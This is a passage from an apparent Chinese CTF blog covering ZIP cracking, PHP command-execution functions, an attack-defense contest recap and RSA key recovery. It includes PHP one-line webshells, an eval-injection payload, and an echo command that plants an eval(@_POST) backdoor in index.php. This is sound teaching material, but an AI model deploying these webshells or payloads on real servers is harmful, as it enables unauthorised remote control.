00<br>且压缩源文件目录区的全局方式位标记应当为09 00</p><p>真加密</p><p>压缩源文件数据区的全局加密应当为09 00<br>且压缩源文件目录区的全局方式位标记应当为09 00</p><h2 id="0x03-ZIP明文攻击"><a href="#0x03-ZIP明文攻击" class="headerlink" title="0x03 ZIP明文攻击"></a>0x03 ZIP明文攻击</h2><p>如果一个压缩包你不知道密码，但是压缩包里有一个已知文件（文件大小大于12Byte），因为同一个压缩包里的文件都是采用同一个密钥加密，所以可以用已知文件来找密钥。</p><p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g5kb052ll8j30g70fhwhx.jpg" alt></p><h2 id="0x03-ZIP掩码攻击"><a href="#0x03-ZIP掩码攻击" class="headerlink" title="0x03 ZIP掩码攻击"></a>0x03 ZIP掩码攻击</h2><p>已知密码的某几位进行构造，这里以桂电的MISC为例，前面我们已经解开两层加密，得到了最后的111.zip,<br>里面有</p><p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g5kb0bwn1ej305b02bt8i.jpg" alt></p><p>打开.sh文件是这样的内容</p><pre><code>#!/bin/bash#zip -e --password=`python -c &quot;print(__import__(&apos;time&apos;).time())&quot;` flag.zip flag</code></pre><p>跑一下命令</p><pre><code>&gt;&gt;&gt; print(__import__(&apos;time&apos;).time())1558685006.11</code></pre><p>大概形式知道了尝试掩码攻击</p><p><img src="http://wx3.sinaimg.cn/mw690/006boCb9ly1g5kb0ltqooj30fh0f0gp8.jpg" alt></p><p><img src="http://wx3.sinaimg.cn/mw690/006boCb9ly1g5kb0oiik6j30f206d0tr.jpg" alt></p><h2 id="0x04-CRC32碰撞"><a href="#0x04-CRC32碰撞" class="headerlink" title="0x04 CRC32碰撞"></a>0x04 CRC32碰撞</h2><p>CRC本身是循环冗余校验码的意思，CRC32则表示产生一个32bit（8位十六进制数）的校验值</p><p>在生成该校验值的时候源数据每一位都参与了运算，因此即使数据块中只有一位发生改变也会得到不同的CRC32值，利用这个原理我们可以直接爆破出加密文件的内容。<br>这里做测试用我们创建了一个内容只有‘1234’的txt文件并进行压缩，得到压缩的CRC值，写脚本进行爆破</p><pre><code>import binasciicrc=0x9BE3E0A3for i in range(1000,9999+1):if (binascii.crc32(str(i)) &amp; 0xffffffff) == crc:    print i</code></pre><p>由于内容较短几秒就碰撞出文件内容。</p><p>在PY2.x版本中。binascii.crc32中所计算出的CRC值域为[-2^31,2^31-1]之间的有符号整数，为了与一般的CRC结果对比，需要将其转换为无符号整数，所以加上 &amp; 0xfffffffff来进行转换</p><pre><code>&gt;&gt;&gt; str1=0x4D2&gt;&gt;&gt; str2=str1 &amp; 0xffff&gt;&gt;&gt; print str21234</code></pre><p>如果是py3.x版本计算结果为无符号整数，就不用加了。 </p><h2 id="0x05-其他乱七八糟的"><a href="#0x05-其他乱七八糟的" class="headerlink" title="0x05 其他乱七八糟的"></a>0x05 其他乱七八糟的</h2><h3 id="关于fcrackzip"><a href="#关于fcrackzip" class="headerlink" title="关于fcrackzip"></a>关于fcrackzip</h3><p>作为kali自带的工具，可以使用它来进行爆破工作，这里还是用桂电的MISC-222.zip为例</p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5kb0955f3j30ls0fndvz.jpg" alt></p><p>由菜单可知-b 是爆破，-c 指定字符集,-l指定长度,-u 用解压的方式淘汰掉错误的密码。当然我们也可以跑字典</p><pre><code># fcrackzip -D -p /字典位置/xxx.txt  -u crack_this.zip</code></pre><h3 id="关于图片格式问题"><a href="#关于图片格式问题" class="headerlink" title="关于图片格式问题"></a>关于图片格式问题</h3><p>png文件署名域</p><ul><li>十进制数：137 80 78 71 13 10 26 10</li><li>十六进制：89 50 4e 47 0d 0a 1a 0a</li></ul><h3 id="文件头总结"><a href="#文件头总结" class="headerlink" title="文件头总结"></a>文件头总结</h3><pre><code>JPEG (jpg)，                        　　文件头：FFD8FF　　　　　　　　　　　　　　　　　　　　　　　 文件尾：FF D9　　　　　　　　　　　　　　　PNG (png)，                       　　 文件头：89504E47　　　　　　　　　　　　　　　　　　　　　　文件尾：AE 42 60 82GIF (gif)，                           　　文件头：47494638　　　　　　　　　　　　　　　　　　　　　　文件尾：00 3B                                                                 ZIP Archive (zip)，                     文件头：504B0304　　　　　　　　　　　　　　　　　　　　　　文件尾：50 4BTIFF (tif)，                           　  文件头：49492A00　　　　　　　　　　　　　　　　　　　　　　文件尾：Windows Bitmap (bmp)，      　  文件头：424D　　　　　　　　　　　　　　　　　　　　　　　　 文件尾：CAD (dwg)，                        　  文件头：41433130　　　　　　　　　　　　　　　　　　　　　　文件尾：Adobe Photoshop (psd)，          文件头：38425053　　　　　　　　　　　　　　　　　　　　　　文件尾：Rich Text Format (rtf)，             文件头：7B5C727466　　　　　　　　　　　　　　　　　　　　  文件尾：XML (xml)，                              文件头：3C3F786D6C　　　　　　　　　　　　　　　　　　　　 文件尾：HTML (html)，                           文件头：68746D6C3EEmail [thorough only] (eml)，     文件头：44656C69766572792D646174653AOutlook Express (dbx)，            文件头：CFAD12FEC5FD746FOutlook (pst)，                         文件头：2142444EMS Word/Excel (xls.or.doc)，      文件头：D0CF11E0MS Access (mdb)，                    文件头：5374616E64617264204AWordPerfect (wpd)，                  文件头：FF575043Adobe Acrobat (pdf)，               文件头：255044462D312EQuicken (qdf)，                         文件头：AC9EBD8FWindows Password (pwl)，         文件头：E3828596RAR Archive (rar)，                    文件头：52617221Wave (wav)，                            文件头：57415645AVI (avi)，                                 文件头：41564920Real Audio (ram)，                     文件头：2E7261FDReal Media (rm)，                       文件头：2E524D46MPEG (mpg)，                           文件头：000001BAMPEG (mpg)，                           文件头：000001B3Quicktime (mov)，                     文件头：6D6F6F76Windows Media (asf)，               文件头：3026B2758E66CF11MIDI (mid)，                              文件头：4D546864</code></pre><h3 id="zip文件格式"><a href="#zip文件格式" class="headerlink" title="zip文件格式"></a>zip文件格式</h3><p>翻译作者的文章链接<br><a href="https://blog.csdn.net/luoye7422/article/details/41878969" target="_blank" rel="noopener">https://blog.csdn.net/luoye7422/article/details/41878969</a></p><p>参考链接</p><blockquote><p><a href="https://www.jianshu.com/p/4d8cace82028" title="图片格式详解" target="_blank" rel="noopener">https://www.jianshu.com/p/4d8cace82028</a><br>更详细解释：<a href="https://blog.csdn.net/u012611878/article/details/52215985" target="_blank" rel="noopener">https://blog.csdn.net/u012611878/article/details/52215985</a><br><a href="https://blog.csdn.net/xiangshangbashaonian/article/details/80156865" target="_blank" rel="noopener">https://blog.csdn.net/xiangshangbashaonian/article/details/80156865</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> zip </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行漏洞(Command Execution)</title>
      <link href="/2019/03/23/Command-Execution/"/>
      <url>/2019/03/23/Command-Execution/</url>
      
        <content type="html"><![CDATA[<p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system,exec,shell_exec等，当用户可以执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行漏洞。</p><a id="more"></a><h2 id="漏洞概念"><a href="#漏洞概念" class="headerlink" title="漏洞概念"></a>漏洞概念</h2><p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system,exec,shell_exec等，当用户可以执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行漏洞。</p><h2 id="要区别命令执行漏洞和代码执行漏洞"><a href="#要区别命令执行漏洞和代码执行漏洞" class="headerlink" title="要区别命令执行漏洞和代码执行漏洞"></a>要区别命令执行漏洞和代码执行漏洞</h2><p><strong>命令执行漏洞直接调用操作系统命令</strong></p><p><strong>原理</strong>：在操作系统中”&amp;,|,||”都可以作为命令连接符使用，用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令</p><p><strong>代码执行漏洞靠执行脚本代码调用系统命令</strong></p><p><strong>原理</strong>：应用有时现需要调用一些执行系统命令的函数，如PHP中的system,exec,shell_exec,passthru,popen,proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而执行攻击。</p><h2 id="linux的特殊字符"><a href="#linux的特殊字符" class="headerlink" title="linux的特殊字符"></a>linux的特殊字符</h2><ol><li><p>‘;’的用法</p><p> 先执行它之前的命令，知道前面的命令执行完（无论对与错）就立即执行后面的命令。</p></li><li><p>‘|’的用法</p><p> 上一条命令的输出，作为下一条命令的参数</p></li><li><p>‘&amp;&amp;’的用法</p><p> 只用前面的命令执行成功，才能执行后面的命令</p></li></ol><h2 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h2><p>8/20/2019 7:32:16 PM </p><h3 id="php代码执行"><a href="#php代码执行" class="headerlink" title="php代码执行"></a>php代码执行</h3><p>eval()</p><blockquote><p>eval — 把字符串作为PHP代码执行</p></blockquote><pre><code>mixed eval( string $code)&lt;?php    eval($_GET[&apos;a&apos;]);    ?&gt;</code></pre><p>常见的一句话木马，访问：</p><pre><code>http://xxx/php_cmd.php?a=phpinfo();</code></pre><p>得到phpinfo页面。这里注意将字符串当作code执行，也就是说我们传入的字符串要符合php规范，分号不能忘。</p><p>assert()</p><blockquote><p>assert — 检查一个断言是否为 FALSE</p></blockquote><p>php5</p><pre><code>bool assert( mixed $assertion[, string $description] )</code></pre><p>php7</p><pre><code>bool assert( mixed $assertion[, Throwable $exception] )</code></pre><blockquote><p>如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。 assertion 是字符串的优势是当禁用断言时它的开销会更小，并且在断言失败时消息会包含 assertion 表达式。这意味着如果你传入了 boolean 的条件作为 assertion，这个条件将不会显示为断言函数的参数；在调用你定义的 assert_options() 处理函数时，条件会转换为字符串，而布尔值 FALSE 会被转换成空字符串。 </p></blockquote><pre><code>&lt;?php    assert($_GET[&apos;a&apos;]);    ?&gt;</code></pre><p>此时访问phpinfo()不用加分号也能得到对应页面。</p><p>preg_replace</p><blockquote><pre><code>preg_replace — 执行一个正则表达式的搜索和替换</code></pre></blockquote><pre><code>mixed preg_replace( mixed $pattern, mixed $replacement, mixed $subject[, int $limit = -1[, int &amp;$count]] )</code></pre><p>搜索subject中匹配pattern的部分，以replacement进行替换。</p><p>搜索subject中匹配pattern的部分， 以replacement进行替换。当使用被弃用的 e 修饰符时, 这个函数会转义一些字符即(：’、”、 \ 和 NULL) 然后进行后向引用替换，在完成替换后，引擎会将结果字符串作为php代码使用eval方式进行评估并将返回值作为最终参与替换的字符串。如果要在replacement 中使用反斜线，必须使用4个(“\\“，译注：因为这首先是php的字符串，经过转义后，是两个，再经过正则表达式引擎后才被认为是一个原文反斜线)。 </p><blockquote><p>PHP 5.5.0 起， 传入 “\e” 修饰符的时候，会产生一个 E_DEPRECATED 错误； PHP 7.0.0 起，会产生 E_WARNING 错误，同时 “\e” 也无法起效。</p></blockquote><p>call_user_func()</p><blockquote><p>call_user_func — 把第一个参数作为回调函数调用</p></blockquote><pre><code>mixed call_user_func( callable $callback[, mixed $parameter[, mixed $...]] )&lt;?php    call_user_func($_GET[&apos;a&apos;],$_GET[&apos;b&apos;]);?&gt;</code></pre><p>访问：</p><pre><code>http://xxx/php_cmd.php?a=assert&amp;b=phpinfo()</code></pre><p>call_user_func_array()</p><blockquote><p>call_user_func_array — 调用回调函数，并把一个数组参数作为回调函数的参数</p></blockquote><pre><code>mixed call_user_func_array( callable $callback, array $param_arr)</code></pre><p>把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。 </p><pre><code>&lt;?php    call_user_func_array($_GET[&apos;a&apos;],$_GET[&apos;b&apos;]);?&gt;</code></pre><p>访问：</p><pre><code>http://xxx/php_cmd.php?a=assert&amp;b[]=phpinfo()</code></pre><p>create_function</p><blockquote><p>create_function — Create an anonymous (lambda-style) function</p></blockquote><pre><code>string create_function( string $args, string $code)</code></pre><p>Creates an anonymous function from the parameters passed, and returns a unique name for it.<br>第一个参数args是后面定义函数的参数，第二个参数是函数的代码。</p><blockquote><p>This function internally performs an eval() and as such has thesame security issues as eval(). </p></blockquote><pre><code>&lt;?php    $a = $_GET[&apos;c&apos;];    $b = create_function(&apos;$a&apos;,&quot;echo $a&quot;);    $b(&apos;&apos;);?&gt;</code></pre><p>访问</p><pre><code>http://xxx/php_cmd.php?c=phpinfo();</code></pre><p>array_map</p><blockquote><p>array_map — 为数组的每个元素应用回调函数 </p></blockquote><pre><code>array array_map( callable $callback, array $array1[, array $...] )</code></pre><p>array_map()：返回数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。 </p><pre><code>&lt;?php    $array = array(0,1,2,3,4,5);    array_map($_GET[&apos;a&apos;],$array);?&gt;</code></pre><p>访问</p><pre><code>http://xxx/php_cmd.php?a=phpinfo</code></pre><p>没有分号<code>;</code>也没有括号<code>()</code>！同时从返回结果也可以看出array中的数组数量决定了返回值的数量。</p><h3 id="系统命令执行"><a href="#系统命令执行" class="headerlink" title="系统命令执行"></a>系统命令执行</h3><p>system()</p><blockquote><p>system — 执行外部程序，并且显示输出</p></blockquote><pre><code>string system( string $command[, int &amp;$return_var] )</code></pre><blockquote><p>同 C 版本的 system() 函数一样，本函数执行 command 参数所指定的命令，并且输出执行结果。 如果提供 return_var 参数， 则外部命令执行后的返回状态将会被设置到此变量中。</p><p>如果 PHP 运行在服务器模块中， system() 函数还会尝试在每行输出完毕之后，自动刷新 web 服务器的输出缓存。 </p></blockquote><pre><code>&lt;?php    system(&apos;whoami&apos;);?&gt;</code></pre><p>passthru()</p><blockquote><p>passthru — 执行外部程序并且显示原始输出</p></blockquote><pre><code>void passthru( string $command[, int &amp;$return_var] )</code></pre><blockquote><p>同 exec() 函数类似， passthru() 函数也是用来执行外部命令（command）的。当所执行的 Unix 命令输出二进制数据，并且需要直接传送到浏览器的时候，需要用此函数来替代 exec() 或 system() 函数。常用来执行诸如 pbmplus 之类的可以直接输出图像流的命令。通过设置 Content-type 为 image/gif，然后调用 pbmplus 程序输出 gif 文件，就可以从 PHP 脚本中直接输出图像到浏览器。<br>如果提供 return_var 参数， Unix 命令的返回状态会被记录到此参数。 </p></blockquote><pre><code>&lt;?php    passthru(&quot;whoami&quot;);?&gt;</code></pre><p>exec()</p><blockquote><p>exec — 执行一个外部程序</p></blockquote><pre><code>string exec( string $command[, array &amp;$output[, int &amp;$return_var]] )</code></pre><p>exec() 执行 command 参数所指定的命令。</p><blockquote><p>如果提供了 output 参数，那么会用命令执行的输出填充此数组，每行输出填充数组中的一个元素。数组中的数据不包含行尾的空白字符，例如 \n 字符。请注意，如果数组中已经包含了部分元素，exec() 函数会在数组末尾追加内容。如果你不想在数组末尾进行追加，请在传入 exec() 函数之前对数组使用 unset() 函数进行重置。<br>如果同时提供 output 和 return_var 参数，命令执行后的返回状态会被写入到此变量</p></blockquote><pre><code>&lt;?php    echo exec(&quot;whoami&quot;);?&gt;</code></pre><p>pcntl_exec()</p><blockquote><p>pcntl_exec — 在当前进程空间执行指定程序</p></blockquote><pre><code>void pcntl_exec( string $path[, array $args[, array $envs]] )</code></pre><p>以给定的参数执行程序</p><blockquote><p>path必须时可执行二进制文件路径或一个在文件第一行指定了一个可执行文件路径标头的脚本（比如文件第一行是#!/usr/local/bin/perl的perl脚本）。<br>args是一个要传递给程序的参数的字符串数组。<br>envs是一个要传递给程序作为环境变量的字符串数组。这个数组是 key =&gt; value格式的，key代表要传递的环境变量的名称，value代表该环境变量值。 </p></blockquote><pre><code>&lt;?php    pcntl_exec ( &quot;/bin/bash&quot; , array(&quot;whoami&quot;));?&gt;</code></pre><p>shell_exec()</p><blockquote><p>shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。</p></blockquote><pre><code>&lt;?php    echo shell_exec(&quot;whoami&quot;);?&gt;</code></pre><p>popen()</p><blockquote><p>popen — 打开进程文件指针</p></blockquote><pre><code>resource popen( string $command, string $mode)</code></pre><blockquote><p>打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。<br>当模式为 ‘r’，返回的文件指针等于命令的 STDOUT，当模式为 ‘w’，返回的文件指针等于命令的 STDIN。 </p></blockquote><pre><code>&lt;?php$handle = popen(&quot;/bin/ls&quot;, &quot;r&quot;);?&gt; </code></pre><p>proc_open()</p><blockquote><p>proc_open — 执行一个命令，并且打开用来输入/输出的文件指针。 </p></blockquote><pre><code>resource proc_open( string $cmd, array $descriptorspec, array &amp;$pipes[, string $cwd[, array $env[, array $other_options]]] )</code></pre><blockquote><p>descriptorspec<br>一个索引数组。数组的键表示描述符，数组元素值表示 PHP 如何将这些描述符传送至子进程。 0 表示标准输入（stdin），1 表示标准输出（stdout），2 表示标准错误（stderr）。 </p><p>数组中的元素可以是：<br>•包含了要传送至进程的管道的描述信息。第一个元素为描述符类型，第二个元素是针对该描述符的选项。有效的类型有：pipe （第二个元素可以是： r 向进程传送该管道的读取端，w 向进程传送该管道的写入端），以及 file（第二个元素为文件名）。<br>•表达一个真实文件描述符的流资源类型（例如：已打开的文件，一个 socket 端口，STDIN）。 </p></blockquote><p>`(反单引号)</p><p>在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出，使用反引号运算符“`”的效果与函数 shell_exec() 相同。</p><pre><code>&lt;?php    echo `whoami`;?&gt;</code></pre><p>ob_start()</p><blockquote><p>ob_start — 打开输出控制缓冲</p></blockquote><pre><code>bool ob_start([ callback $output_callback[, int $chunk_size[, bool $erase]]] )</code></pre><blockquote><p>此函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部缓冲区中。 </p></blockquote><p>下面的代码，由于调用了ob_end_flush()，所以会调用ob_start(cmd)中的cmd，把我们输入的_GET[a]作为cmd的参数。</p><pre><code>&lt;?php    $cmd = &apos;system&apos;;    ob_start($cmd);    echo &quot;$_GET[a]&quot;;    ob_end_flush();?&gt;</code></pre><p>访问：</p><pre><code>http://xxx/php_cmd.php?a=whoami</code></pre><p>php mail()</p><p>mail()文档<a href="http://php.net/manual/zh/function.mail.php" title="mail文档" target="_blank" rel="noopener">http://php.net/manual/zh/function.mail.php</a></p><pre><code>bool mail (    string $to ,    string $subject ,    string $message [,    string $additional_headers [,    string $additional_parameters ]])</code></pre><p>要使用mail()函数，需要配置对应的服务器等，在php.ini中有两个选项：</p><pre><code>配置SMTP服务器的主机名和端口配置PHP用作邮件传输代理（MTA）的文件路径</code></pre><p>当PHP配置了第二个选项时，对该mail()函数的调用将导致执行配置对MTA程序。虽然PHP内部使用escapeshellcmd()用于程序调用，防止新的shell命令注入，但第5个参数$additional_parameters中mail()允许添加的新程序。因此，攻击者可以附加程序标志，在某些MTA中可以创建具有用户控制内容的文件。</p><p>实例：<a href="http://blog.nsfocus.net/tag/php-mail%E5%87%BD%E6%95%B0%E5%BC%95%E5%8F%91%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%BC%8F%E6%B4%9E/" title="多个php mail函数引发的命令执行漏洞" target="_blank" rel="noopener">http://blog.nsfocus.net/tag/php-mail%E5%87%BD%E6%95%B0%E5%BC%95%E5%8F%91%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%BC%8F%E6%B4%9E/</a></p><p>参考：<a href="http://www.91ri.org/17039.html" title="为什么mail()函数在php中是危险的" target="_blank" rel="noopener">http://www.91ri.org/17039.html</a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote><p><a href="https://chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 ISCC线下赛回顾</title>
      <link href="/2018/07/22/ISCC%E7%BA%BF%E4%B8%8B%E8%B5%9B%E5%9B%9E%E9%A1%BE/"/>
      <url>/2018/07/22/ISCC%E7%BA%BF%E4%B8%8B%E8%B5%9B%E5%9B%9E%E9%A1%BE/</url>
      
        <content type="html"><![CDATA[<p>不比不知道自己跟大佬差距有多大！开局直接全场被大佬挂黑页，等着运维回复几个小时之后好不容易找到shell路径，shell又被其他大佬删了…真是菜哭了，一下午的比赛毫无作为…</p><a id="more"></a><h2 id="web1-私地渗透"><a href="#web1-私地渗透" class="headerlink" title="web1 私地渗透"></a>web1 私地渗透</h2><p>先是注册页面拿到shell路径，具体操作看SQL那篇吧。</p><p>拿到路径之后访问之后是这样的</p><pre><code>&lt;?phpshow_source(__FILE__);$a=@$_REQUEST[&apos;a&apos;];@eval(&quot;var_dump($$a);&quot;);?&gt;</code></pre><p>先分析一下代码，主要几个函数</p><ul><li>show_source():查看文件源码</li><li>eval():把字符串当做php代码执行</li><li>var_dump():打印变量信息，返回值为null</li></ul><p>这里有明显的变量引用，我们可以控制$a的值来命令执行。</p><h3 id="php中单引号与双引号的区别"><a href="#php中单引号与双引号的区别" class="headerlink" title="php中单引号与双引号的区别"></a>php中单引号与双引号的区别</h3><pre><code>&lt;?php$c=&quot;Luc1fer!&quot;;echo &quot;My name is &quot;.$c.&quot;&lt;br&gt;&quot;;       //不加引号echo &quot;My name is &quot;.&apos;$c&apos;.&quot;&lt;br&gt;&quot;;        //单引号echo &quot;My name is &quot;.&quot;$c&quot;.&quot;&lt;br&gt;&quot;;        //双引号echo &quot;My name is &quot;.&quot; &apos;$c&apos; &quot;.&quot;&lt;br&gt;&quot;;    //双引号+单引号echo &quot;My name is &quot;.&apos; &quot;$c&quot; &apos;.&quot;&lt;br&gt;&quot;; //单引号+双引号?&gt;</code></pre><p>输出结果如下</p><pre><code>My name is Luc1fer!                    //正常显示My name is $c                        //单引号不被解析My name is Luc1fer!                    //双引号内正常解析My name is &apos;Luc1fer!&apos;                //双引号内正常解析My name is &quot;$c&quot;                     //单引号内不被解析</code></pre><h3 id="php变量覆盖"><a href="#php变量覆盖" class="headerlink" title="php变量覆盖"></a>php变量覆盖</h3><p>测试代码：</p><pre><code>&lt;?phpshow_source(__FILE__);$b=&quot;Hello,my name is Luc1fer!&quot;;$a=@$_REQUEST[&apos;a&apos;];echo $$a;?&gt;</code></pre><p>结果如下：</p><pre><code> &lt;?phpshow_source(__FILE__);$b=&quot;Hello,my name is Luc1fer!&quot;;$a=@$_REQUEST[&apos;a&apos;];echo $$a;?&gt; Hello,my name is Luc1fer!</code></pre><p>代码的执行过程大概为  <code>get一个a--&gt;echo执行从右到左--&gt;echo $$a--&gt;echo $b--&gt;打印$b</code><br>我们可以通过?a=a=”hello”这样的方式来打印hello</p><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>对于var_dump()我们可以构造单引号使其闭合</p><pre><code>&lt;?phpshow_source(__FILE__);$a=@$_REQUEST[&apos;a&apos;];@eval(&quot;var_dump($$a);&quot;);?&gt;http://localhost/only-test-php.php?a=a=4);system(phpinfo()</code></pre><p>这样就可以打印phpinfo()信息了</p><p>同样的我们可以cat flag了.</p><h2 id="私地与高地"><a href="#私地与高地" class="headerlink" title="私地与高地"></a>私地与高地</h2><h3 id="主要问题"><a href="#主要问题" class="headerlink" title="主要问题"></a>主要问题</h3><p>等拿到私地权限之后就只剩40多分钟了，WINSCP死活连不上私地，没办法像往常一样down源码，上监控上waf，有点手忙脚乱，这边Xshell连上了，查看www目录发现全是马，打开几个手动注释了马，其他的都是readonly文件</p><ol><li>面对被写上的马，如果我是ctf权限，且文件readonly该怎么删掉这个马？</li></ol><p>赛后和老师讨论，老师说连不上WINSCP为什么不用wegt命令下源码？这个当时确实没想到，下次要注意。还有没上脚本的问题，同学指出可以直接用vim打开之后复制粘贴进去监控脚本，这个当时确实懵圈了，只在那傻傻的手工注释。</p><p>2.面对不死马我该怎么去删掉这个不死马？</p><p>比赛前准备的方法有kill进程、重启Apache、创建同名文件，这些在这次比赛中都没有真正实践到</p><p>3.如何在拿到权限之后批量给别人传马？</p><p>说实话我这个地方还是没懂，按理说应该是利用预留的后门然后执行写入命令</p><pre><code>echo -e &quot;&lt;?php eval(\@_POST[&apos;a&apos;]);?&gt;&quot; &gt; index.php | chomod 777 index.php</code></pre><p>但是怎么批量呢？用批量提交flag那个么？还带去问问师傅</p>]]></content>
      
      
      <categories>
          
          <category> 比赛回顾 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛回顾 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA</title>
      <link href="/2018/05/23/RSA/"/>
      <url>/2018/05/23/RSA/</url>
      
        <content type="html"><![CDATA[<p>我才二十出头，为什么要承受这么多…</p><a id="more"></a><p>pubkey.pem文件构成</p><p>Jarvis OJ mediumRSA为例</p><p>下载文件我们得到了flag.enc和pubkey.pem，<br>使用openssl来获取公钥信息</p><pre><code>root@kali-ctf:~/RSA/mediumRSA# openssl rsa -pubin -in pubkey.pem -text -modulusPublic-Key: (256 bit)Modulus:00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f:1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f:be:30:ddExponent: 65537 (0x10001)Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DDwriting RSA key-----BEGIN PUBLIC KEY-----MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDryigb/+l/vjDdAgMBAAE=-----END PUBLIC KEY-----</code></pre><p>这里的Exponent：65537(0x10001) 即为e.</p><p>Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD 即为N.</p><p>这里通过看<a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9430579.html" title="大佬博客" target="_blank" rel="noopener">https://www.cnblogs.com/ECJTUACM-873284962/p/9430579.html</a>简单说一下pem文件组成。</p><p>简单来讲，pem文件就是用于ASCII(Base64)编码的各种X.509 v3证书。</p><p>文件由BEGIN开始，END结束。文件内容要根据base64编码解码之后，得到的数据进行增加或删减特殊字符等。</p><p>接着上面的题目，我们已经知道了n,e，接着去factor分解N得到p,q，生成私钥后解密flag.enc文件。</p><pre><code>#!/usr/bin/env python# -*- coding: utf-8 -*-import gmpy2from Crypto.Util.number import long_to_bytesp = 275127860351348928173285174381581152299q = 319576316814478949870590164193048041239n = 87924348264132406875276140514499937145050893665602592992418171647042491658461e = 65537d = gmpy2.invert(e, (p - 1) * (q - 1))with open(&apos;flag.enc&apos;, &apos;r&apos;) as f:        c = f.read().encode(&apos;hex&apos;)        c = int(c, 16)m = pow(c, d, n)print long_to_bytes(m)</code></pre><p>这里再说一下openssl</p><ul><li><p>查看公钥文件 </p></li><li><p>  openssl rsa -pubin -in pubkey.pem -text -modulus</p></li><li><p>解密</p></li><li><p><code>rsautl -decrypt -inkey private.pem -in flag.enc -out flag</code></p></li></ul><h2 id="模数相关攻击"><a href="#模数相关攻击" class="headerlink" title="模数相关攻击"></a>模数相关攻击</h2><h3 id="d泄露攻击"><a href="#d泄露攻击" class="headerlink" title="d泄露攻击"></a>d泄露攻击</h3><p><a href="http://www.ams.org/notices/199902/boneh.pdf" title="原理看这篇paper" target="_blank" rel="noopener">http://www.ams.org/notices/199902/boneh.pdf</a> </p><p>题目参考西湖论剑线下赛RSA</p><p>chall.py</p><pre><code>    from gmpy2 import invertfrom md5 import md5from secret import p, qe = 65537n = p*qphi = (p-1)*(q-1)d = invert(e, phi)print n, e, dprint &quot;Flag: flag{%s}&quot; %md5(str(p + q)).hexdigest()</code></pre><p>output</p><pre><code>n=16352578963372306131642407541567045533766691177138375676491913897592458965544068296813122740126583082006556217616296009516413202833698268845634497478988128850373221853516973259086845725813424850548682503827191121548693288763243619033224322698075987667531863213468223654181658012754897588147027437229269098246969811226129883327598021859724836993626315476699384610680857047403431430525708390695622848315322636785398223207468754197643541958599210127261345770914514670199047435085714403641469016212958361993969304545214061560160267760786482163373784437641808292654489343487613446165542988382687729593384887516272690654309e= 65537 d=9459928379973667430138068528059438139092368625339079253289560577985304435062213121398231875832264894458314629575455553485752685643743266654630829957442008775259776311585654014858165341757547284112061885158006881475740553532826576260839430343960738520822367975528644329172668877696208741007648370045520535298040161675407779239300466681615493892692265542290255408673533853011662134953869432632554008235340864803377610352438146264524770710345273439724107080190182918285547426166561803716644089414078389475072103315432638197578186106576626728869020366214077455194554930725576023274922741115941214789600089166754476449453Flag: flag{xxxx}</code></pre><p>d 泄露之后我们可以解密所有加密的消息，还可以对模数进行分解，脚本如下</p><pre><code>import randomdef gcd(a, b):if a &lt; b:    a, b = b, awhile b != 0:    temp = a % b    a = b    b = tempreturn adef getpq(n,e,d):p = 1q = 1while p==1 and q==1:    k = d * e - 1    g = random.randint ( 0 , n )    while p==1 and q==1 and k % 2 == 0:        k /= 2        y = pow(g,k,n)        if y!=1 and gcd(y-1,n)&gt;1:            p = gcd(y-1,n)            q = n/pprint p,qdef 